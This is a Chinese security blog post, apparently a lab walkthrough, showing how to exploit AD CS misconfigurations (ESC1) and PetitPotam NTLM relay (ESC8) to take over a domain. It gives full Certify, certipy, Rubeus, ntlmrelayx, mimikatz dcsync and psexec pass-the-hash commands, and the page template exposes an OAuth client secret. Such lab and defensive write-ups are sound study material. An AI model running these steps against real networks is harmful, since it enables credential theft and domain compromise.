@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="1y0ng" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      ADCS相关利用 
+      
+      
+      |
+    
+     1y0ng&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon2.png">
+    <link rel="icon" href="/images/favicon2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/favicon2.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">1y0ng</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/Tool/">
+          <a href="/Tool/">Tool</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ADCS相关利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-09-27 10:59:09
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="概述">概述</h2>
+<p><code>Active Directory Certificate Services (ADCS)</code> 是微软 Windows Server 操作系统中的一个角色，主要用于构建和管理公钥基础设施（PKI）。</p>
+<h3 id="Kerberos认证过程">Kerberos认证过程</h3>
+<p><img src="image-20240924104915455.png" alt="image-20240924104915455"></p>
+<h3 id="PKINIT认证">PKINIT认证</h3>
+<p>PKINIT（Public Key Infrastructure for Initial Authentication）是Kerberos协议的一个扩展，它允许使用公钥证书进行初始身份认证。与传统的Kerberos身份验证相比，PKINIT提供了一种基于公钥加密的认证机制，增强了安全性。</p>
+<p>在PKINIT认证过程中，客户端和Kerberos认证服务器（KDC）使用证书和私钥进行通信，而不是使用密码或密钥散列。以下是PKINIT认证的基本步骤：</p>
+<ol>
+<li><strong>证书注册</strong>：客户端生成一对公钥和私钥，并把公钥证书送至证书颁发机构（CA）签名。CA对客户端的公钥进行签名，并颁发证书给客户端。KDC也需要一个由CA颁发的证书，以便客户端可以验证KDC的身份。</li>
+<li><strong>PKINIT认证请求</strong>：在Kerberos的AS-REQ（Authentication Service Request）消息中，客户端会附上它的<code>证书</code>和用<code>私钥</code>签名的请求。KDC使用客户端证书中的<code>公钥</code>进行解密，并验证签名是否有效。确认有效之后返回使用<code>证书公钥</code>加密的 TGT 并且消息是使用 KDC 私钥签名，客户端使用 KDC 公钥进行签名校验，随后使用<code>证书私钥</code>解密成功拿到 TGT。</li>
+<li><strong>会话密钥交换</strong>：一旦认证成功，KDC和客户端将使用Diffie-Hellman密钥交换或其他机制来安全地协商一个会话密钥。</li>
+</ol>
+<h3 id="证书模板">证书模板</h3>
+<p><code>证书模板</code>是用于定义证书属性和颁发规则的预设配置，它在公钥基础设施（PKI）中用于指导证书颁发机构（CA）自动颁发具有特定属性和用途的证书。</p>
+<p>简单来说，就是不同证书可以发挥不同的作用，利用证书模板来决定这个证书可以用来干什么。</p>
+<p>通过<code>控制面板</code>-<code>管理工具</code>-<code>证书颁发机构</code>可以看到所有的证书模板。</p>
+<p><img src="image-20240924111154747.png" alt="image-20240924111154747"></p>
+<h3 id="应用程序策略-oid">应用程序策略 (oid)</h3>
+<p>当创建证书模板时，可以指定一系列的OID，这些OID定义了证书的用途和它们的扩展属性。</p>
+<p>然而只有包含了 <code>Client Authentication</code>（客户端身份认证）、<code>PKINIT Client Authentication</code>、<code>Smart Card Logon</code>（智能卡登录）、<code>Any Purpose</code>（任何目的）、<code>SubCA</code> 时，对应的证书才能充当 PKINIT 身份认证凭据。</p>
+<p><img src="image-20240924113036880.png" alt="image-20240924113036880"></p>
+<p>环境说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">主域控：192.168.74.138	主机名：WIN-KD9M44NUV16  域名：lyy.com</span><br><span class="line">辅域控：192.168.74.143</span><br><span class="line">域内机器：192.168.74.142</span><br><span class="line">域用户：user1/Wsx123.</span><br><span class="line">kali：192.168.74.135</span><br></pre></td></tr></table></figure>
+<p>环境搭建可参考<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1583">ADCS小结</a></p>
+<blockquote>
+<p>由于ESC8漏洞涉及到NTLM RELAY，然而微软在ms08-068中对Relay到自身机器做了限制，严禁Relay到机器自身所以这里必须要搭建<code>ADCS服务器+域控服务器</code>或<code>ADCS搭在域控上+辅域控</code></p>
+</blockquote>
+<h2 id="ADCS漏洞–ESC1">ADCS漏洞–ESC1</h2>
+<h3 id="条件">条件</h3>
+<p>1、我们需要有权限去获取（注册）证书<br>
+2、能够登记为客户端身份验证或智能卡登录等<br>
+3、CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT开启</p>
+<h3 id="配置">配置</h3>
+<p>对于第一个条件，直接在域控里赋予<code>Domain Users</code>组注册权限即可</p>
+<p><img src="image-20240924144326786.png" alt="image-20240924144326786"></p>
+<p>对于第二个条件需在<code>拓展</code>的<code>应用程序策略</code>中加入<code>客户端身份验证</code></p>
+<p><img src="image-20240924144437546.png" alt="image-20240924144437546"></p>
+<p>第三个条件则需要在<code>使用者名称</code>中选择<code>在请求中提供</code></p>
+<p><img src="image-20240924144637011.png" alt="image-20240924144637011"></p>
+<h3 id="复现">复现</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /add user1 Wsx123. /domain #创建user1用户</span><br></pre></td></tr></table></figure>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">Certify.exe</a>（exe版本可在<a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe">此处下载</a>）同时需要有个Interop.CERTENROLLLib.dll（可通过nuget下载<a target="_blank" rel="noopener" href="https://www.nuget.org/api/v2/package/Interop.CERTENROLLLib/1.0.0">nupkg</a>文件后通过解压工具提取），且需要.NET环境。</p>
+<p><img src="image-20240924092923460.png" alt="image-20240924092923460"></p>
+<p>检测是否存在证书配置错误</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure>
+<p>可以看到发现了一个错误的的证书模板</p>
+<p><img src="image-20240924093850305.png" alt="image-20240924093850305"></p>
+<p>定位CA机器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -config - -ping</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924094100168.png" alt="image-20240924094100168"></p>
+<p>获取证书</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:WIN-KD9M44NUV16.lyy.com\lyy-WIN-KD9M44NUV16-CA /template:ESC1 /altname:administrator</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924095350038.png" alt="image-20240924095350038"></p>
+<p>将<code>-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----</code>复制保存为<code>cert.pem</code></p>
+<p>用kali上的openssl将cert.pem换算为cert.pfx，不需要输入密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924095651936.png" alt="image-20240924095651936"></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a>（<a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe">exe下载</a>）获取administrator管理员的TGT</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /dc:192.168.74.138 /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924100511554.png" alt="image-20240924100511554"></p>
+<p>klist查看当前缓存的 Kerberos 票据</p>
+<p><img src="image-20240924101541924.png" alt="image-20240924101541924"></p>
+<p>查看域控c盘下的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-KD9M44NUV16\c$</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924100821971.png" alt="image-20240924100821971"></p>
+<p>也可以在kali使用<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">certipy</a>来进行利用</p>
+<p>安装certipy</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install certipy-ad</span><br></pre></td></tr></table></figure>
+<p>查询对于用户user1存在哪些证书模板可利用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u user1@lyy.com -p Wsx123. -dc-ip 192.168.74.138 -vulnerable -debug -vulnerable</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924144808728.png" alt="image-20240924144808728"></p>
+<p>可以看到35个证书模板中颁布了12个模板，其中1个模板存在漏洞，查看具体的漏洞信息可以发现检测出来了ESC1漏洞</p>
+<p><img src="image-20240924145046116.png" alt="image-20240924145046116"></p>
+<p>通过-upn参数去获取administrator的证书</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u user1@lyy.com -p Wsx123. -ca lyy-WIN-KD9M44NUV16-CA -target-ip 192.168.74.138 -template ESC1 -upn administrator@lyy.com</span><br></pre></td></tr></table></figure>
+<p>获取用户hash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx 111.pfx -dc-ip 192.168.74.138</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240924150732833.png" alt="image-20240924150732833"></p>
+<p>对于不同的证书模板有不同的利用方式，具体可参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12267">利用ADCS不安全模板配置提升域权限</a></p>
+<h2 id="ADCS漏洞–ESC8-PetitPotam-ADCS-relay">ADCS漏洞–ESC8(PetitPotam)(ADCS relay)</h2>
+<p>由于在ADCS的认证中支持NTLM认证，所以可使用ntlm relay窃取用户HASH</p>
+<p><img src="image-20240924152530626.png" alt="image-20240924152530626"></p>
+<p>访问<code>http://192.168.74.138/certsrv/certfnsh.asp</code>发现需要用户认证</p>
+<p><img src="image-20240925134239826.png" alt="image-20240925134239826"></p>
+<h3 id="复现-v2">复现</h3>
+<p>使用<code>ntlmrelayx.py</code>将证书颁发机构 (CA) 设置为中继目标，开启监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">pip3 install .</span><br><span class="line">python3 setup.py install</span><br><span class="line"></span><br><span class="line">python3 ntlmrelayx.py -t http://192.168.74.138/certsrv/certfnsh.asp -smb2support --adcs --template &#x27;Domain Controller&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240925095204623.png" alt="image-20240925095204623"></p>
+<blockquote>
+<p><code>--adcs</code>：这个参数用于指示攻击者想要利用 Active Directory 证书服务 (ADCS) 的漏洞。ADCS 是 Windows Server 中的一个角色服务，用于颁发和管理系统的公钥基础结构 (PKI) 证书。<code>--template 'Domain Controller'</code>：这个参数后面跟着的是模板名称，用于指示 <code>ntlmrelayx</code> 在执行攻击时应该模仿哪种类型的服务或计算机。在这个例子中，使用了 ‘Domain Controller’ 模板，意味着攻击者试图模仿域控制器的行为。</p>
+</blockquote>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a>进行攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PetitPotam.py -u &#x27;&#x27; -d &#x27;&#x27; -p &#x27;&#x27; 192.168.74.135（攻击机中转，回连地址） 192.168.74.143（辅域）</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240925132432111.png" alt="image-20240925132432111"></p>
+<blockquote>
+<p>PetitPotam漏洞利用了微软加密文件系统远程协议（MS-EFSRPC，MicroSoft Encrypting File System Remote Protocol）。MS-EFSRPC是 Microsoft 的加密文件系统远程协议，用于对远程存储和通过网络访问的加密数据执行“维护和管理操作”。利用该漏洞，黑客通过连接到LSARPC强制触发目标机器向指定远程<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&amp;from=20065">服务器</a>发送Net-NTLM Hash，从而攻击者在拿到Net-NTLM Hash后能进行NTLM Relay攻击，进而接管整个域。</p>
+</blockquote>
+<p>ntlmrelayx.py捕获到了ntlm认证，并将认证信息保存到了<code>WIN-6K645OMCGG8$.pfx</code>文件中</p>
+<p><img src="image-20240925132546613.png" alt="image-20240925132546613"></p>
+<p>使用Rubeus.exe获取凭证信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:WIN-6K645OMCGG8$ /certificate:WIN-6K645OMCGG8$.pfx /dc:192.168.74.138 /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240925133314353.png" alt=""></p>
+<p>使用mimikatz提取票据中的密码hash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /all /csv /domain:lyy.com</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240925133720334.png" alt="image-20240925133720334"></p>
+<p>通过PTH成功在域控上执行了命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py lyy/administrator@192.168.74.138 -hashes :70834250207c9b16a3e6cd8c9d3a8054</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240925134053918.png" alt="image-20240925134053918"></p>
+<h3 id="防御">防御</h3>
+<p>​	1.关闭证书服务的web端点，或者开启SSL认证</p>
+<p>​	2.开启NTML中继保护</p>
+<p>​	<a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-cn/topic/kb5005413-%E7%BC%93%E8%A7%A3-active-directory-%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E4%B8%8A%E7%9A%84-ntlm-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429">KB5005413：缓解 Active Directory 证书服务上的 NTLM 中继攻击 (AD CS)</a></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10395">ADCS中的ntlm relay</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1583">ADCS小结</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.noah.360.net/active-directory-certificate-services-attack-and-exploit/">ADCS 攻击面挖掘与利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12267">利用ADCS不安全模板配置提升域权限</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/2024/%E5%88%A9%E7%94%A8%E4%BB%A3%E7%90%86%E4%BD%9C%E4%B8%9A%E5%8A%AB%E6%8C%81SQL%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%AD%E6%8D%AE%E6%9D%A5%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-09-27 10:59:09
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-text">Kerberos认证过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PKINIT%E8%AE%A4%E8%AF%81"><span class="toc-text">PKINIT认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-text">证书模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AD%96%E7%95%A5-oid"><span class="toc-text">应用程序策略 (oid)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS%E6%BC%8F%E6%B4%9E%E2%80%93ESC1"><span class="toc-text">ADCS漏洞–ESC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-text">配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS%E6%BC%8F%E6%B4%9E%E2%80%93ESC8-PetitPotam-ADCS-relay"><span class="toc-text">ADCS漏洞–ESC8(PetitPotam)(ADCS relay)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-v2"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '94b011918fa9c2f8b107',
+        clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+        repo: '1y0ng.github.io',
+        owner: '1y0ng',
+        admin: ['1y0ng'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ADCS%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2F2024%2FADCS%25E7%259B%25B8%25E5%2585%25B3%25E5%2588%25A9%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/2024/ADCS%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
